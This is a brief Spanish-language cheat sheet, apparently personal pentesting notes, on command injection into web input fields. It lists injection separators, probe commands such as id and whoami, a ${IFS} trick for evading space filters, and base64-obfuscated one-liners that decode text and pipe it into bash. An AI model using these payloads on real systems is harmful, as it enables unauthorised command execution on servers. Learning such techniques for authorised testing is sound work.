### Inyección de comandos WEB  

hay varias maneras de inyectar comandos, por ejemplo en burpsuite. Si identificamos un campo, lugar donde creemos que se pueda inyectar comandos, aquí se listan varias opciones para hacerlo.  
```
$(comando)
;comando
;comando;
;comando;#

No todos los comandos funcionan, probar con: id, whoami, ps, ls ...
```

Si no nos permite espacios:  
```
Cambiamos el espacio por ${IFS} ejemplo:
echo${IFS}hola${IFS}mundo
```

Conversión a base64 (para evitar el error con caracteres no permitidos, como el &)
```
# Bash B64 Ofuscated
{echo,COMMAND_BASE64}|{base64,-d}|bash 
echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
echo COMMAND_BASE64 | base64 -d | bash 
```